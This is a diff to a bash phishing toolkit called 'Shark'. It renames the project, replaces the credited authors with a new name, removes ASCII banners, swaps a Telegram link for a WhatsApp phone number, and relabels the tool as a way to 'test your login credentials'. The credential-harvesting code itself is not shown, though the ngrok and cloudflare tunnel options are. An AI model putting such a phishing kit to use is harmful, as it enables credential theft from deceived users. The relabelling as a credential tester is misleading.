@@ -1,12 +1,12 @@
 #!/bin/bash
 ##############################################
 #                                            #
-#             PROJECT: SHARK                 #
-#              SHARK ©2022-2023              #
+#             PROJECT: SHARK123              #
+#              SHARK123 ©2022-2023           #
 #           BEST PHISHING TOOLS BY           #
-#             M r. D e r e K   (Contributor) #
-#          B h a v i k   O z a (Publisher)   #  
-#         A s h i s h  S i n g h (Author)    #
+#     M r. V R U S H A B H     (Contributor) #
+#     V R U S H A B H          (Publisher)   #  
+#     V R U S H A B H P O L      (Author)    #
 ##############################################
 
 #########
@@ -581,13 +581,7 @@ link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${logfile}.cloud.log");a
 }
 function prt() {
 clear         
-printf "
-${red}      ░██████╗██╗░░██╗░█████╗░██████╗░██╗░░██╗
-${nc}      ██╔════╝██║░░██║██╔══██╗██╔══██╗██║░██╔╝
-${yellow}      ╚█████╗░███████║███████║██████╔╝█████═╝░
-${green}      ░╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗░
-${blue}      ██████╔╝██║░░██║██║░░██║██║░░██║██║░╚██╗
-${purple}      ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝ ${yellow}.beta v${VERSION}\n\n"
+
 printf "${red}[A]$cafe :${green} ngrok $cafe\e[0;33m[\e[0;31mGoogle Alert!\e[0;33m]
 
 ${red}[B]$cafe :${green} cloudflare $cafe\e[0;33m[\e[0;32mNEW!\e[0;33m]
@@ -781,9 +775,9 @@ banner2() {
         ╚════════════════════════════════════╝
                 
         Shark beta : ${white}v${VERSION}${green}
-        Reborn by  : ${white}Mr.Derek(E343IO)${green} •
-         Publisher : ${white}Bhavik Oza${green}       •
-	    Author : ${white}Ashish Singh${green}     • 
+        Reborn by  : ${white}Mr.Vrushabh (E343IO)${green} •
+         Publisher : ${white}Vrushabh Pol${green}       •
+	    Author : ${white}Vrushabh Pol${green}     • 
             ${yellow}Note   : help us by giving your feedback
 
         》 ${cyan1}${final_url}${yellow} 《 MODIFIED URL.
@@ -913,7 +907,7 @@ if [[ ! -e "${logfile}.sharkmsg" ]]; then
 Developers assume NO liability and are NOT responsible for any damage caused by this program.
 Also we want to inform you that some of your actions may be ILLEGAL and you CAN NOT use this
 software to test device, company or any other type of target without WRITTEN PERMISSION from them.\n\n"
-msg "Give us your feedback on telegram chat grp:- https://t.me/bhaviktutorial\n"
+msg "Give us your feedback on whatsapp : 9518586837 \n"
 
 read -p $'\e[1;40m\e[1;92m T O  R U N  S H A R K  A C C E P T  D I S C L A I M E R\e[1;93m (Y/N) : \e[0m' shmsg
 
@@ -1024,14 +1018,7 @@ msgsh
 while :
 do
 	clear
-        printf "${green}
-
-        ██████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗
-       ██╔════╝██║  ██║██╔══██╗██╔══██╗██║ ██╔╝
-       ╚█████╗ ███████║███████║██████╔╝█████═╝${white}
-        ╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗
-       ██████╔╝██║  ██║██║  ██║██║  ██║██║ ╚██╗
-       ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ${cyan1}.beta v${VERSION}\n\n "
+        
 
       printf "${green}       ╔──────────────────────────────────────╗\n"
       printf "${green}        |   ${cyan1}B  E  T  A    V  E  R  S  I  O  N  ${green}|\n"
@@ -1294,8 +1281,8 @@ function banner(){
 done
 
 #####################################################################
-#                                                                   #
-#      simply changing this banner will not make you developer      #
+#                    Vrushabh Pol                                   #
+#             TEST YOUR LOGIN CREDENTIALS                           #
 #                   KEEP SUPPORTING                                 #
 #                      THANKYOU                                     #
 #                                                                   #
